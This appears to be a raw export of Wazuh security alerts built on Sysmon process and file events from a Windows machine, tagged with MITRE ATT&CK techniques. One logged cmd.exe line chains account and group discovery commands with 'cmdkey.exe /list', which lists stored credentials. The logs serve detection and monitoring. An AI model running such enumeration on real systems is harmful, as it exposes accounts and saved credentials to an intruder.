ProcessId: 5232
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-5188-6758-d693-370000000000}
LogonId: 0x3793D6
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-6b08-6758-1204-000000000200}
ParentProcessId: 9700
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T16:23:36.4606539Z,6428,3480,DESKTOP-QGB4EQH,1,2452,INFORMATION,Microsoft-Windows-Sysmon,3,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 10, 2024 @ 16:23:37.539",EventChannel,1733847817,"Dec 10, 2024 @ 16:23:37.539", , , , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-6b08-6758-1804-000000000200},5232,23:36.5,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , , , , , , , , , ,{15959494-6b08-6758-1204-000000000200},{15959494-5188-6758-d693-370000000000},"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0x3793d6,9700,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,net  localgroup,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,Y8djsZMBnOFSf1lyKEdJ,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 16:24:39.466
ProcessGuid: {15959494-6b47-6758-1a04-000000000200}
ProcessId: 8544
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_o2fxwrdg.xg0.ps1
CreationUtcTime: 2024-12-10 16:24:39.466
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T16:24:39.4732552Z,6439,3480,DESKTOP-QGB4EQH,11,2452,INFORMATION,Microsoft-Windows-Sysmon,4,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 16:24:40.591",EventChannel,1733847880,"Dec 10, 2024 @ 16:24:40.591", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-6b47-6758-1a04-000000000200},8544,24:39.5, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_o2fxwrdg.xg0.ps1,24:39.5, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
